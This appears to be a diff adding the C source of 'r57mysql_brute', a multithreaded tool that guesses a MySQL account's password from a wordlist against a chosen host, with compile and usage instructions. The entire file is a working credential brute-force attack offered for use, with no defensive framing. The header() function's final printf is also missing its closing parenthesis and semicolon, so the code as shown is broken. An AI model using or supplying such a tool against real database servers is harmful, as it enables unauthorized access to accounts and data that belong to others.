@@ -1,0 +1,153 @@
+/*
+r57mysql_brute - little bruteforce tool for MySQL
+
+compile:
+gcc -c `mysql_config --cflags` r57mysql_brute.c
+gcc -o r57mysql_brute r57mysql_brute.o `mysql_config --libs` -lpthread
+*/
+
+#include <stdio.h>
+#include <unistd.h>
+#include <mysql.h>
+#include <pthread.h>
+
+#define SZ 0x32
+#define TN 50 // threads number
+
+void header();
+void usage(char *);
+void *check(void *);
+
+// globals
+pthread_mutex_t mtx = PTHREAD_MUTEX_INITIALIZER;
+FILE *wordlist;
+char *login = NULL;
+char *host  = NULL;
+char *file  = NULL;   
+int  port   = 0;
+int  verbose = 0;
+int all = 0;
+int found = 0;   
+char res[SZ];
+int count = 0;
+
+int main(int argc, char *argv[])
+{
+pthread_t tid[TN];
+char c;
+int  i = 0;
+   
+while((c = getopt(argc, argv, "h:p:l:w:v"))!= EOF)
+  {
+   switch (c)
+    {
+    case 'h':
+     host=optarg;
+    break;
+    case 'l':
+     login=optarg;
+    break;
+    case 'w':
+     file=optarg;
+    break;
+    case 'p':
+     port=atoi(optarg);
+    break;
+    case 'v':
+     verbose = 1;
+    break;
+    default:
+     usage(argv[0]);
+    break;         
+    }
+  }
+
+if(file==NULL||login==NULL) usage(argv[0]);
+header();
+
+if((wordlist = fopen(file, "r")) == 0)
+  {
+  printf("[-] Can't open wordlist file %s\n",file);
+  exit(1);
+  }   
+
+printf("[!] Bruteforce in progress...\n");
+
+for(i=0;i<TN;i++)
+  {   
+  pthread_create(&tid[i], NULL, check, NULL);
+  pthread_detach(tid[i]);
+  }
+
+while(!all) { sleep(1); }
+
+pthread_mutex_destroy(&mtx);
+fclose(wordlist);
+
+if(!verbose) printf("\n");
+printf("################################################\n");
+printf("[+] Bruteforce complete\n");
+printf("################################################\n");
+if(found) printf("[+] FOUND PASSWORD : %s\n",res);
+else printf("[-] PASSWORD NOT FOUND\n");
+printf("################################################\n");   
+}
+
+
+void *check(void *arg)
+{
+MYSQL *conn;
+char passwd[SZ];
+
+conn = mysql_init(NULL);
+
+while(1)
+  {   
+   pthread_mutex_lock(&mtx);
+   if(all||found) { pthread_mutex_unlock(&mtx); break; }   
+   if(feof(wordlist)){ all = 1; pthread_mutex_unlock(&mtx); break; }
+   fgets(passwd,SZ,wordlist);     
+   if(passwd[strlen(passwd)-1] == '\n') passwd[strlen(passwd)-1] = '\0';
+   count++;     
+   pthread_mutex_unlock(&mtx);
+   
+   if(!verbose)
+    {   
+    printf("\r[~] Trying ... [ %d ]",count);
+    fflush(stdout);   
+    }   
+   
+   if(mysql_real_connect(conn, host, login, passwd,NULL,port,NULL,0))
+    {   
+    pthread_mutex_lock(&mtx);
+    all = found = 1;
+    strcpy(res,passwd);
+    if(verbose) printf("[%s:%s] - [ DONE ] - Password found!\n",login,passwd);     
+    pthread_mutex_unlock(&mtx);     
+    break;
+    }
+   else
+    {     
+    if(verbose) printf("[%s:%s] - [ FAIL ] - %d %s\n",login,passwd,mysql_errno(conn),mysql_error(conn));
+    }
+  }
+return NULL;
+}
+
+void usage(char *name)
+{
+header();
+printf("Usage: %s -l <login> -w <wordlist> [options]\n",name);
+printf("Options:\n");
+printf("  -h <host> - MySQL host\n");   
+printf("  -p <port> - MySQL port\n");
+printf("  -v        - verbose output\n");     
+exit(0);   
+}
+
+void header()
+{
+printf("################################################\n"
+       "# r57mysql_brute - little bruteforce for MySQL #\n"
+       "################################################\n"
+}
